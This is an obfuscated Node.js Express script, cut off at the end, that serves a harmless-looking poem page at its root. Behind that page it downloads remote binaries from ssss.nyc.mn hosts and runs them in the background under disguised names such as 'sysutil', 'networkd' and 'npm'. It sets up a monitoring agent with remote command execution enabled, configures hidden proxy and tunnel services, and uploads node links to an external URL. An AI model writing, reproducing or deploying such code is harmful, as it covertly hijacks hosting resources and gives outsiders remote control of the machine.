const _0x35df8d=_0x5d51;(function(_0x497716,_0x2b156c){const _0x1e990e=_0x5d51,_0x179dbe=_0x497716();while(!![]){try{const _0x12212d=parseInt(_0x1e990e(0x103))/0x1+parseInt(_0x1e990e(0x10a))/0x2+parseInt(_0x1e990e(0x192))/0x3+-parseInt(_0x1e990e(0x191))/0x4+-parseInt(_0x1e990e(0x136))/0x5+parseInt(_0x1e990e(0x187))/0x6+parseInt(_0x1e990e(0x122))/0x7;if(_0x12212d===_0x2b156c)break;else _0x179dbe['push'](_0x179dbe['shift']());}catch(_0x19d25d){_0x179dbe['push'](_0x179dbe['shift']());}}}(_0x4833,0x7be43));const express=require('express'),app=express(),axios=require('axios'),os=require('os'),fs=require('fs'),path=require('path'),{promisify}=require(_0x35df8d(0x134)),exec=promisify(require('child_process')[_0x35df8d(0xf4)]),{execSync}=require(_0x35df8d(0x15b)),UPLOAD_URL=process[_0x35df8d(0x132)][_0x35df8d(0x18f)]||'',PROJECT_URL=process[_0x35df8d(0x132)]['PROJECT_URL']||'',AUTO_ACCESS=process[_0x35df8d(0x132)][_0x35df8d(0x133)]||![],FILE_PATH=process[_0x35df8d(0x132)][_0x35df8d(0x101)]||_0x35df8d(0x115),SUB_PATH=process[_0x35df8d(0x132)][_0x35df8d(0xd8)]||_0x35df8d(0x119),KEY=process[_0x35df8d(0x132)][_0x35df8d(0x16f)]||_0x35df8d(0x130),WUKONG_SERVER=process[_0x35df8d(0x132)][_0x35df8d(0xc6)]||'',WUKONG_PORT=process['env'][_0x35df8d(0x165)]||'',WUKONG_KEY=process[_0x35df8d(0x132)][_0x35df8d(0x125)]||'',CLOUD_DOMAIN=process[_0x35df8d(0x132)][_0x35df8d(0x12e)]||'',CLOUD_TOKEN=process[_0x35df8d(0x132)]['CLOUD_TOKEN']||'',CLOUD_PORT=process[_0x35df8d(0x132)][_0x35df8d(0x118)]||0x1f41,TUIC_PORT=process[_0x35df8d(0x132)][_0x35df8d(0xbd)]||0x9c40,HY2_PORT=process[_0x35df8d(0x132)][_0x35df8d(0xe7)]||0xc350,REALITY_PORT=process['env'][_0x35df8d(0x102)]||0xea60,CFIP=process[_0x35df8d(0x132)]['CFIP']||_0x35df8d(0x117),CFPORT=process[_0x35df8d(0x132)][_0x35df8d(0x10e)]||0x1bb,PORT=process[_0x35df8d(0x132)][_0x35df8d(0x18a)]||0xbb8,NAME=process[_0x35df8d(0x132)][_0x35df8d(0x14a)]||'Vl',CHAT_ID=process[_0x35df8d(0x132)][_0x35df8d(0xd2)]||'',BOT_TOKEN=process[_0x35df8d(0x132)][_0x35df8d(0x15c)]||'';!fs[_0x35df8d(0x124)](FILE_PATH)?(fs[_0x35df8d(0x18c)](FILE_PATH),console['log'](FILE_PATH+_0x35df8d(0x121))):console[_0x35df8d(0xce)](FILE_PATH+_0x35df8d(0xe9));let privateKey='',publicKey='',npmPath=path['join'](FILE_PATH,_0x35df8d(0x177)),wukongPath=path[_0x35df8d(0x13d)](FILE_PATH,'wukong'),sysutilPath=path[_0x35df8d(0x13d)](FILE_PATH,_0x35df8d(0xf5)),networkdPath=path[_0x35df8d(0x13d)](FILE_PATH,'networkd'),subPath=path[_0x35df8d(0x13d)](FILE_PATH,'sub.txt'),listPath=path[_0x35df8d(0x13d)](FILE_PATH,'list.txt'),bootLogPath=path['join'](FILE_PATH,_0x35df8d(0xd4)),configPath=path['join'](FILE_PATH,_0x35df8d(0x11f));function deleteNodes(){const _0xd2e942=_0x35df8d;try{if(!UPLOAD_URL)return;const _0x318900=path[_0xd2e942(0x13d)](FILE_PATH,_0xd2e942(0xe2));if(!fs[_0xd2e942(0x124)](_0x318900))return;let _0x3c5cab;try{_0x3c5cab=fs[_0xd2e942(0xcb)](_0x318900,_0xd2e942(0x10c));}catch{return null;}const _0x215dbc=Buffer[_0xd2e942(0x189)](_0x3c5cab,'base64')['toString'](_0xd2e942(0x10c)),_0x5c562d=_0x215dbc[_0xd2e942(0x139)]('\x0a')[_0xd2e942(0xbc)](_0xdf7308=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0xd2e942(0xfc)](_0xdf7308));if(_0x5c562d[_0xd2e942(0xf6)]===0x0)return;return axios[_0xd2e942(0x18e)](UPLOAD_URL+_0xd2e942(0xfe),JSON[_0xd2e942(0x18d)]({'nodes':_0x5c562d}),{'headers':{'Content-Type':'application/json'}})['catch'](_0x1ab702=>{return null;});}catch(_0x38fce4){return null;}}const pathsToDelete=['sysutil',_0x35df8d(0x178),_0x35df8d(0x177),_0x35df8d(0xe0),_0x35df8d(0xd4),'list.txt'];function cleanupOldFiles(){const _0x5aec58=_0x35df8d;pathsToDelete[_0x5aec58(0x16c)](_0x3c635a=>{const _0x550464=_0x5aec58,_0x44be15=path['join'](FILE_PATH,_0x3c635a);fs[_0x550464(0x14c)](_0x44be15,()=>{});});}cleanupOldFiles(),app[_0x35df8d(0x168)]('/',function(_0x226fd0,_0x4addba){const _0x3d3554=_0x35df8d,_0x357627=_0x3d3554(0x180);_0x4addba[_0x3d3554(0x14e)]('Content-Type',_0x3d3554(0x15f)),_0x4addba[_0x3d3554(0x16d)](_0x357627);});function _0x4833(){const _0x494cfa=['Telegram\x20message\x20sent\x20successfully','\x20>/dev/null\x202>&1\x20&','false','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','curl\x20-s\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','\x20run','fileName','wukong','CLOUD_TOKEN\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','sub.txt','netflix','Content-Type','\x0atuic://','cert.pem','HY2_PORT','writeFileSync','\x20already\x20exists','Download\x20','curl\x20-s\x20--max-time\x202\x20ipv4.ip.sb','./wukong','vmess','tunnel.json','8.8.8.8','\x0a\x20\x20tunnel:\x20','arm64','binary','?sni=www.bing.com&congestion_control=bbr&udp_relay_mode=native&alpn=h3&allow_insecure=1#','exec','sysutil','length','unshift','\x20--loglevel\x20info\x20--url\x20http://localhost:','&type=tcp&headerType=none#','Private\x20Key:','bmXOC+F1FxEMF9dyiK2H5/1SUtzH0JuVo51h2wPfgyo=','test','curl\x20-s\x20--max-time\x201\x20ipv6.ip.sb','/api/delete-nodes','catch','https://amd64.ssss.nyc.mn/agent','FILE_PATH','REALITY_PORT','67553QWzdlB','vless','/api/add-subscriptions','https://arm64.ssss.nyc.mn/sb','https://api.telegram.org/bot','www.iij.ad.jp','private.key','1326532tfBSzt','map','utf-8','replace','CFPORT','clear','pipe','sysutil\x20running\x20error:\x20','2096','config.yaml','\x5c$&','./.npm','\x20run\x20-c\x20','skk.moe','CLOUD_PORT','sub123','mPZo+V9qlrMGCZ7+E6z2NI6NOV34PD++TpAR09PtCWI=','automatic\x20access\x20task\x20added\x20successfully','Error\x20executing\x20command:\x20','error','./sysutil','config.json','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','\x20is\x20created','2088947RoSapl','https://amd64.ssss.nyc.mn/sb','existsSync','WUKONG_KEY','tunnel.yml','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','finish','has','Error\x20generating\x20private.key:\x20','```','remote','CLOUD_DOMAIN','response','161fc0b2-cfa3-4053-8d51-20aeee66c2dd','./npm','env','AUTO_ACCESS','util','443','3042555tYfAwH','TunnelSecret','./networkd','split','Error\x20generating\x20reality-keypair:\x20','\x22\x20>/dev/null\x202>&1\x20&','sysutil\x20is\x20running','join','https://raw.githubusercontent.com/MetaCubeX/meta-rules-dat/sing/geo/geosite/openai.srs','block','Sec-WebSocket-Protocol','tls','2087','nohup\x20','pop','aarch64','CLOUD_DOMAIN:','toString','\x20>/dev/null\x202>&1','https://bing.com','NAME','wukong\x20running\x20error:\x20','unlink','vmess://','setHeader','\x0aclient_secret:\x20','ArgoDomain:','MarkdownV2','arch','PrivateKey\x20or\x20PublicKey\x20is\x20missing,\x20retrying...','172.16.0.2/32','base64','chmod','utf8','\x20-p\x20','Failed\x20to\x20send\x20Telegram\x20message','stream','child_process','BOT_TOKEN','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','https://arm64.ssss.nyc.mn/v1','text/html;\x20charset=utf-8','data','listen','hysteria2','https://amd64.ssss.nyc.mn/v1','TG\x20variables\x20is\x20empty,Skipping\x20push\x20nodes\x20to\x20TG','WUKONG_PORT','\x20generate\x20reality-keypair','networkd\x20is\x20running','get','\x20-s\x20','\x0a\x20\x20credentials-file:\x20','https://amd64.ssss.nyc.mn/2go','forEach','send','text/plain;\x20charset=utf-8','KEY','unlinkSync','openai','info','\x0askip_connection_count:\x20false\x0askip_procs_count:\x20false\x0atemperature:\x20false\x0atls:\x20','push','Subscription\x20uploaded\x20successfully','Error\x20reading\x20boot.log:','npm','networkd','fileUrl','https://arm64.ssss.nyc.mn/agent','hysteria-in','/?sni=www.bing.com&insecure=1&alpn=h3&obfs=none#','bbr','status','match','\x0a<!DOCTYPE\x20html>\x0a<html\x20lang=\x22en\x22>\x0a<head>\x0a\x20\x20\x20\x20<meta\x20charset=\x22UTF-8\x22>\x0a\x20\x20\x20\x20<title>A\x20Moment\x20of\x20Reflection</title>\x0a\x20\x20\x20\x20<style>\x0a\x20\x20\x20\x20\x20\x20\x20\x20body\x20{\x20font-family:\x20serif;\x20background-color:\x20#f0f2f5;\x20color:\x20#333;\x20display:\x20flex;\x20justify-content:\x20center;\x20align-items:\x20center;\x20height:\x20100vh;\x20margin:\x200;\x20text-align:\x20center;\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20pre\x20{\x20font-size:\x201.2em;\x20line-height:\x201.7;\x20white-space:\x20pre-wrap;\x20padding:\x202em;\x20background:\x20#fff;\x20border-radius:\x208px;\x20box-shadow:\x200\x204px\x2012px\x20rgba(0,0,0,0.08);\x20}\x0a\x20\x20\x20\x20</style>\x0a</head>\x0a<body>\x0a\x20\x20\x20\x20<pre>\x0aThe\x20river\x20flows,\x20a\x20silver\x20thread,\x0aReflecting\x20skies\x20above\x20your\x20head.\x0a\x0aEach\x20drop\x20a\x20choice,\x20each\x20turn\x20a\x20test,\x0aTo\x20find\x20the\x20sea\x20and\x20be\x20at\x20rest.\x0a\x0aNot\x20in\x20the\x20end,\x20but\x20in\x20the\x20ride,\x0aIs\x20where\x20the\x20truest\x20currents\x20hide.\x0a\x20\x20\x20\x20</pre>\x0a</body>\x0a</html>\x0a\x20\x20','\x20failed:\x20','Public\x20Key:','arm','local','close','WUKONG\x20variable\x20is\x20empty,\x20skipping\x20running','209346TjSqTG','添加URL失败:\x20','from','PORT','direct','mkdirSync','stringify','post','UPLOAD_URL','set','1276768MGJyZc','1113093dHcVOt','\x0avless://','2083','filter','TUIC_PORT','wireguard-out','npm\x20running\x20error:\x20','2606:4700:110:83c7:b31f:5858:b3a8:c6b1/128','/vmess-argo','?encryption=none&flow=xtls-rprx-vision&security=reality&sni=www.iij.ad.jp&fp=chrome&pbk=','8443','wireguard','2053','WUKONG_SERVER','true','then','message','application/json','readFileSync','trim','vmess-ws-in','log','tuic-in','includes','162.159.195.100','CHAT_ID','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','boot.log','all','none','Error\x20downloading\x20files:','SUB_PATH'];_0x4833=function(){return _0x494cfa;};return _0x4833();}function getSystemArchitecture(){const _0x21b6cf=_0x35df8d,_0x1a9e4f=os[_0x21b6cf(0x152)]();return _0x1a9e4f==='arm'||_0x1a9e4f===_0x21b6cf(0xf1)||_0x1a9e4f===_0x21b6cf(0x145)?_0x21b6cf(0x183):'amd';}function downloadFile(_0x29b35a,_0x508951,_0x46e972){const _0x49205a=_0x35df8d,_0x1694c6=path[_0x49205a(0x13d)](FILE_PATH,_0x29b35a),_0x42eaf9=fs['createWriteStream'](_0x1694c6);axios({'method':_0x49205a(0x168),'url':_0x508951,'responseType':_0x49205a(0x15a)})[_0x49205a(0xc8)](_0x2323a7=>{const _0x1efcbb=_0x49205a;_0x2323a7[_0x1efcbb(0x160)][_0x1efcbb(0x110)](_0x42eaf9),_0x42eaf9['on'](_0x1efcbb(0x129),()=>{const _0x550e2a=_0x1efcbb;_0x42eaf9[_0x550e2a(0x185)](),console[_0x550e2a(0xce)](_0x550e2a(0xea)+_0x29b35a+'\x20successfully'),_0x46e972(null,_0x29b35a);}),_0x42eaf9['on'](_0x1efcbb(0x11d),_0x301c9a=>{const _0x23932f=_0x1efcbb;fs['unlink'](_0x1694c6,()=>{});const _0x55e535=_0x23932f(0xea)+_0x29b35a+_0x23932f(0x181)+_0x301c9a[_0x23932f(0xc9)];console[_0x23932f(0x11d)](_0x55e535),_0x46e972(_0x55e535);});})[_0x49205a(0xff)](_0x271965=>{const _0x29d1ac=_0x49205a,_0x1e4d35=_0x29d1ac(0xea)+_0x29b35a+_0x29d1ac(0x181)+_0x271965[_0x29d1ac(0xc9)];console[_0x29d1ac(0x11d)](_0x1e4d35),_0x46e972(_0x1e4d35);});}async function downloadFilesAndRun(){const _0x3dfc3b=_0x35df8d,_0x1fbe27=getSystemArchitecture(),_0x438460=getFilesForArchitecture(_0x1fbe27);if(_0x438460[_0x3dfc3b(0xf6)]===0x0){console['log']('Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture');return;}const _0xe29f6e=_0x438460[_0x3dfc3b(0x10b)](_0x5d14e8=>{return new Promise((_0x1ae850,_0x19deb0)=>{const _0x3bf6db=_0x5d51;downloadFile(_0x5d14e8[_0x3bf6db(0xdf)],_0x5d14e8[_0x3bf6db(0x179)],(_0xca2d25,_0x33142f)=>{_0xca2d25?_0x19deb0(_0xca2d25):_0x1ae850(_0x33142f);});});});try{await Promise[_0x3dfc3b(0xd5)](_0xe29f6e);}catch(_0x122e6f){console[_0x3dfc3b(0x11d)](_0x3dfc3b(0xd7),_0x122e6f);return;}function _0x39e0ef(_0x511926){const _0x1ca56a=_0x3dfc3b,_0x145ce8=0x1fd;_0x511926[_0x1ca56a(0x16c)](_0x175623=>{const _0x45a5bf=_0x1ca56a,_0x1cc59f=path[_0x45a5bf(0x13d)](FILE_PATH,_0x175623);fs[_0x45a5bf(0x124)](_0x1cc59f)&&fs[_0x45a5bf(0x156)](_0x1cc59f,_0x145ce8,_0x2e03f7=>{const _0x5babc1=_0x45a5bf;_0x2e03f7?console[_0x5babc1(0x11d)]('Empowerment\x20failed\x20for\x20'+_0x1cc59f+':\x20'+_0x2e03f7):console['log']('Empowerment\x20success\x20for\x20'+_0x1cc59f+':\x20'+_0x145ce8['toString'](0x8));});});}const _0x15bbad=WUKONG_PORT?[_0x3dfc3b(0x131),'./sysutil',_0x3dfc3b(0x138)]:[_0x3dfc3b(0xec),_0x3dfc3b(0x11e),_0x3dfc3b(0x138)];_0x39e0ef(_0x15bbad);if(WUKONG_SERVER&&WUKONG_KEY){if(!WUKONG_PORT){const _0x17e1c9=WUKONG_SERVER[_0x3dfc3b(0xd0)](':')?WUKONG_SERVER['split'](':')[_0x3dfc3b(0x144)]():'',_0x34cbb8=new Set([_0x3dfc3b(0x135),_0x3dfc3b(0xc3),_0x3dfc3b(0x112),_0x3dfc3b(0x142),_0x3dfc3b(0xbb),_0x3dfc3b(0xc5)]),_0x18121d=_0x34cbb8[_0x3dfc3b(0x12a)](_0x17e1c9)?_0x3dfc3b(0xc7):_0x3dfc3b(0xdb),_0x38e2a5=_0x3dfc3b(0x14f)+WUKONG_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20false\x0aip_report_period:\x201800\x0areport_delay:\x201\x0aserver:\x20'+WUKONG_SERVER+_0x3dfc3b(0x173)+_0x18121d+_0x3dfc3b(0x127)+KEY;fs[_0x3dfc3b(0xe8)](path[_0x3dfc3b(0x13d)](FILE_PATH,_0x3dfc3b(0x113)),_0x38e2a5);}}exec(path[_0x3dfc3b(0x13d)](FILE_PATH,_0x3dfc3b(0xf5))+_0x3dfc3b(0x166),async(_0x35ed75,_0x3e1477,_0x25da03)=>{const _0x6bb754=_0x3dfc3b;if(_0x35ed75){console[_0x6bb754(0x11d)](_0x6bb754(0x13a)+_0x35ed75['message']);return;}const _0x3b903c=_0x3e1477[_0x6bb754(0x17f)](/PrivateKey:\s*(.*)/),_0x2d0e43=_0x3e1477[_0x6bb754(0x17f)](/PublicKey:\s*(.*)/);privateKey=_0x3b903c?_0x3b903c[0x1]:'',publicKey=_0x2d0e43?_0x2d0e43[0x1]:'';if(!privateKey||!publicKey){console[_0x6bb754(0x11d)]('Failed\x20to\x20extract\x20privateKey\x20or\x20publicKey\x20from\x20output.');return;}console[_0x6bb754(0xce)](_0x6bb754(0xfa),privateKey),console[_0x6bb754(0xce)](_0x6bb754(0x182),publicKey),exec('openssl\x20ecparam\x20-genkey\x20-name\x20prime256v1\x20-out\x20\x22private.key\x22',(_0x1ae4b0,_0x24d492,_0xa14700)=>{const _0xd0ef1a=_0x6bb754;if(_0x1ae4b0){console[_0xd0ef1a(0x11d)](_0xd0ef1a(0x12b)+_0x1ae4b0[_0xd0ef1a(0xc9)]);return;}exec('openssl\x20req\x20-new\x20-x509\x20-days\x203650\x20-key\x20\x22private.key\x22\x20-out\x20\x22cert.pem\x22\x20-subj\x20\x22/CN=bing.com\x22',async(_0x23630a,_0x2623ec,_0x4ee3f5)=>{const _0xef71c7=_0xd0ef1a;if(_0x23630a){console[_0xef71c7(0x11d)]('Error\x20generating\x20cert.pem:\x20'+_0x23630a[_0xef71c7(0xc9)]);return;}if(!privateKey||!publicKey){console['error'](_0xef71c7(0x153));return;}const _0x572a27={'log':{'disabled':!![],'level':_0xef71c7(0x172),'timestamp':!![]},'dns':{'servers':[{'address':_0xef71c7(0xef),'address_resolver':_0xef71c7(0x184)},{'tag':_0xef71c7(0x184),'address':_0xef71c7(0x184)}]},'inbounds':[{'tag':_0xef71c7(0xcd),'type':_0xef71c7(0xed),'listen':'::','listen_port':CLOUD_PORT,'users':[{'uuid':KEY}],'transport':{'type':'ws','path':_0xef71c7(0xc1),'early_data_header_name':_0xef71c7(0x140)}},{'tag':'vless-in','type':_0xef71c7(0x104),'listen':'::','listen_port':REALITY_PORT,'users':[{'uuid':KEY,'flow':'xtls-rprx-vision'}],'tls':{'enabled':!![],'server_name':_0xef71c7(0x108),'reality':{'enabled':!![],'handshake':{'server':_0xef71c7(0x108),'server_port':0x1bb},'private_key':privateKey,'short_id':['']}}},{'tag':_0xef71c7(0x17b),'type':_0xef71c7(0x162),'listen':'::','listen_port':HY2_PORT,'users':[{'password':KEY}],'masquerade':_0xef71c7(0x149),'tls':{'enabled':!![],'alpn':['h3'],'certificate_path':_0xef71c7(0xe6),'key_path':_0xef71c7(0x109)}},{'tag':_0xef71c7(0xcf),'type':'tuic','listen':'::','listen_port':TUIC_PORT,'users':[{'uuid':KEY}],'congestion_control':_0xef71c7(0x17d),'tls':{'enabled':!![],'alpn':['h3'],'certificate_path':_0xef71c7(0xe6),'key_path':_0xef71c7(0x109)}}],'outbounds':[{'type':_0xef71c7(0x18b),'tag':_0xef71c7(0x18b)},{'type':_0xef71c7(0x13f),'tag':_0xef71c7(0x13f)},{'type':_0xef71c7(0xc4),'tag':_0xef71c7(0xbe),'server':_0xef71c7(0xd1),'server_port':0x1194,'local_address':[_0xef71c7(0x154),_0xef71c7(0xc0)],'private_key':_0xef71c7(0x11a),'peer_public_key':_0xef71c7(0xfb),'reserved':[0x1a,0x15,0xe4]}],'route':{'rule_set':[{'tag':_0xef71c7(0xe3),'type':'remote','format':_0xef71c7(0xf2),'url':'https://raw.githubusercontent.com/SagerNet/sing-geosite/rule-set/geosite-netflix.srs','download_detour':_0xef71c7(0x18b)},{'tag':_0xef71c7(0x171),'type':_0xef71c7(0x12d),'format':_0xef71c7(0xf2),'url':_0xef71c7(0x13e),'download_detour':_0xef71c7(0x18b)}],'rules':[{'rule_set':[_0xef71c7(0x171),_0xef71c7(0xe3)],'outbound':_0xef71c7(0xbe)}],'final':_0xef71c7(0x18b)}};fs['writeFileSync'](path[_0xef71c7(0x13d)](FILE_PATH,_0xef71c7(0x11f)),JSON[_0xef71c7(0x18d)](_0x572a27,null,0x2));let _0xccd41b='';if(WUKONG_SERVER&&WUKONG_PORT&&WUKONG_KEY){const _0x4367a3=[_0xef71c7(0x135),'8443',_0xef71c7(0x112),_0xef71c7(0x142),_0xef71c7(0xbb),'2053'];_0x4367a3[_0xef71c7(0xd0)](WUKONG_PORT)?_0xccd41b='--tls':_0xccd41b='';const _0x506178=_0xef71c7(0x143)+path[_0xef71c7(0x13d)](FILE_PATH,_0xef71c7(0x177))+_0xef71c7(0x169)+WUKONG_SERVER+':'+WUKONG_PORT+_0xef71c7(0x158)+WUKONG_KEY+'\x20'+_0xccd41b+_0xef71c7(0xda);try{await execPromise(_0x506178),console[_0xef71c7(0xce)]('npm\x20is\x20running'),await new Promise(_0x164183=>setTimeout(_0x164183,0x3e8));}catch(_0x49409b){console[_0xef71c7(0x11d)](_0xef71c7(0xbf)+_0x49409b);}}else{if(WUKONG_SERVER&&WUKONG_KEY){const _0x275a25=_0xef71c7(0x143)+wukongPath+'\x20-c\x20\x22'+path['join'](FILE_PATH,_0xef71c7(0x113))+_0xef71c7(0x13b);try{await exec(_0x275a25),console['log']('wukong\x20is\x20running'),await new Promise(_0x5d07f4=>setTimeout(_0x5d07f4,0x3e8));}catch(_0x47829b){console[_0xef71c7(0x11d)](_0xef71c7(0x14b)+_0x47829b);}}else console[_0xef71c7(0xce)](_0xef71c7(0x186));}const _0x5e5c96=_0xef71c7(0x143)+sysutilPath+_0xef71c7(0x116)+path[_0xef71c7(0x13d)](FILE_PATH,_0xef71c7(0x11f))+_0xef71c7(0xda);try{await execPromise(_0x5e5c96),console[_0xef71c7(0xce)](_0xef71c7(0x13c)),await new Promise(_0x5cdb58=>setTimeout(_0x5cdb58,0x3e8));}catch(_0x526992){console[_0xef71c7(0x11d)](_0xef71c7(0x111)+_0x526992);}if(fs[_0xef71c7(0x124)](networkdPath)){let _0x54c74e;if(CLOUD_TOKEN[_0xef71c7(0x17f)](/^[A-Z0-9a-z=]{120,250}$/))_0x54c74e=_0xef71c7(0xd3)+CLOUD_TOKEN;else CLOUD_TOKEN['match'](/TunnelSecret/)?_0x54c74e=_0xef71c7(0x120)+path[_0xef71c7(0x13d)](FILE_PATH,_0xef71c7(0x126))+_0xef71c7(0xde):_0x54c74e='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+bootLogPath+_0xef71c7(0xf8)+CLOUD_PORT;try{await execPromise(_0xef71c7(0x143)+networkdPath+'\x20'+_0x54c74e+_0xef71c7(0xda)),console[_0xef71c7(0xce)](_0xef71c7(0x167)),await new Promise(_0x3f80ea=>setTimeout(_0x3f80ea,0x7d0));}catch(_0x126ca3){console[_0xef71c7(0x11d)](_0xef71c7(0x11c)+_0x126ca3);}}await new Promise(_0x3a091c=>setTimeout(_0x3a091c,0x1388)),await extractDomains();});});});}function execPromise(_0x2cd43f){return new Promise((_0x45e88c,_0x512aa8)=>{exec(_0x2cd43f,(_0x23f03c,_0x3887af,_0x4b01d9)=>{_0x23f03c?_0x512aa8(_0x23f03c):_0x45e88c(_0x3887af||_0x4b01d9);});});}function getFilesForArchitecture(_0x124dad){const _0x2af244=_0x35df8d;let _0x105f61;_0x124dad===_0x2af244(0x183)?_0x105f61=[{'fileName':_0x2af244(0xf5),'fileUrl':_0x2af244(0x106)},{'fileName':'networkd','fileUrl':'https://arm64.ssss.nyc.mn/2go'}]:_0x105f61=[{'fileName':_0x2af244(0xf5),'fileUrl':_0x2af244(0x123)},{'fileName':'networkd','fileUrl':_0x2af244(0x16b)}];if(WUKONG_SERVER&&WUKONG_KEY){if(WUKONG_PORT){const _0x1ab86e=_0x124dad===_0x2af244(0x183)?_0x2af244(0x17a):_0x2af244(0x100);_0x105f61['unshift']({'fileName':_0x2af244(0x177),'fileUrl':_0x1ab86e});}else{const _0x439d94=_0x124dad===_0x2af244(0x183)?_0x2af244(0x15e):_0x2af244(0x163);_0x105f61[_0x2af244(0xf7)]({'fileName':_0x2af244(0xe0),'fileUrl':_0x439d94});}}return _0x105f61;}function argoType(){const _0x2dd61d=_0x35df8d;if(!CLOUD_TOKEN||!CLOUD_DOMAIN){console[_0x2dd61d(0xce)]('CLOUD_DOMAIN\x20or\x20CLOUD_TOKEN\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels');return;}if(CLOUD_TOKEN[_0x2dd61d(0xd0)](_0x2dd61d(0x137))){fs[_0x2dd61d(0xe8)](path[_0x2dd61d(0x13d)](FILE_PATH,_0x2dd61d(0xee)),CLOUD_TOKEN);const _0x3821b6=_0x2dd61d(0xf0)+CLOUD_TOKEN[_0x2dd61d(0x139)]('\x22')[0xb]+_0x2dd61d(0x16a)+path[_0x2dd61d(0x13d)](FILE_PATH,_0x2dd61d(0xee))+_0x2dd61d(0x128)+CLOUD_DOMAIN+'\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:'+CLOUD_PORT+_0x2dd61d(0x15d);fs['writeFileSync'](path['join'](FILE_PATH,'tunnel.yml'),_0x3821b6);}else console[_0x2dd61d(0xce)](_0x2dd61d(0xe1));}argoType();async function extractDomains(){const _0x2fb1ac=_0x35df8d;let _0x2e9e63;if(CLOUD_TOKEN&&CLOUD_DOMAIN)_0x2e9e63=CLOUD_DOMAIN,console[_0x2fb1ac(0xce)](_0x2fb1ac(0x146),_0x2e9e63),await _0x4327bf(_0x2e9e63);else try{const _0x141dc5=fs[_0x2fb1ac(0xcb)](path[_0x2fb1ac(0x13d)](FILE_PATH,'boot.log'),'utf-8'),_0x4ce71e=_0x141dc5['split']('\x0a'),_0x281e44=[];_0x4ce71e[_0x2fb1ac(0x16c)](_0x2f7d34=>{const _0x4d5278=_0x2fb1ac,_0x24539d=_0x2f7d34[_0x4d5278(0x17f)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x24539d){const _0x2dd6b5=_0x24539d[0x1];_0x281e44['push'](_0x2dd6b5);}});if(_0x281e44[_0x2fb1ac(0xf6)]>0x0)_0x2e9e63=_0x281e44[0x0],console['log'](_0x2fb1ac(0x150),_0x2e9e63),await _0x4327bf(_0x2e9e63);else{console['log']('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs[_0x2fb1ac(0x170)](path[_0x2fb1ac(0x13d)](FILE_PATH,_0x2fb1ac(0xd4)));async function _0x22c9df(){try{await exec('pkill\x20-f\x20\x22[n]etworkd\x22\x20>\x20/dev/null\x202>&1');}catch(_0x2c5cdf){return null;}}_0x22c9df(),await new Promise(_0xa0a963=>setTimeout(_0xa0a963,0x3e8));const _0x44fa28=_0x2fb1ac(0xdc)+bootLogPath+'\x20--loglevel\x20info\x20--url\x20http://localhost:'+CLOUD_PORT;try{await exec('nohup\x20'+networkdPath+'\x20'+_0x44fa28+'\x20>/dev/null\x202>&1\x20&'),console[_0x2fb1ac(0xce)]('networkd\x20is\x20running.'),await new Promise(_0xc371d0=>setTimeout(_0xc371d0,0x1770)),await extractDomains();}catch(_0x3911a1){console['error'](_0x2fb1ac(0x11c)+_0x3911a1);}}}catch(_0x18901e){console[_0x2fb1ac(0x11d)](_0x2fb1ac(0x176),_0x18901e);}async function _0x4327bf(_0x12d9b4){const _0x39f914=_0x2fb1ac;let _0x1364e9='';try{_0x1364e9=execSync(_0x39f914(0xeb))[_0x39f914(0x147)]()['trim']();}catch(_0xf50d22){try{_0x1364e9='['+execSync(_0x39f914(0xfd))['toString']()[_0x39f914(0xcc)]()+']';}catch(_0x4f40b8){console[_0x39f914(0x11d)]('Failed\x20to\x20get\x20IP\x20address:',_0x4f40b8[_0x39f914(0xc9)]);}}const _0x157c09=execSync(_0x39f914(0xdd),{'encoding':_0x39f914(0x10c)}),_0x249949=_0x157c09[_0x39f914(0xcc)]();return new Promise(_0x5c92d9=>{setTimeout(()=>{const _0x41fdf7=_0x5d51,_0x42b6c9=_0x41fdf7(0x14d)+Buffer['from'](JSON['stringify']({'v':'2','ps':NAME+'-'+_0x249949,'add':CFIP,'port':CFPORT,'id':KEY,'aid':'0','scy':_0x41fdf7(0xd6),'net':'ws','type':_0x41fdf7(0xd6),'host':_0x12d9b4,'path':'/vmess-argo?ed=2048','tls':_0x41fdf7(0x141),'sni':_0x12d9b4,'alpn':''}))[_0x41fdf7(0x147)](_0x41fdf7(0x155));let _0x2b4548=_0x42b6c9;if(TUIC_PORT!==0x9c40){const _0x14211d=_0x41fdf7(0xe5)+KEY+':@'+_0x1364e9+':'+TUIC_PORT+_0x41fdf7(0xf3)+NAME+'-'+_0x249949;_0x2b4548+=_0x14211d;}if(HY2_PORT!==0xc350){const _0x47f9e6='\x0ahysteria2://'+KEY+'@'+_0x1364e9+':'+HY2_PORT+_0x41fdf7(0x17c)+NAME+'-'+_0x249949;_0x2b4548+=_0x47f9e6;}if(REALITY_PORT!==0xea60){const 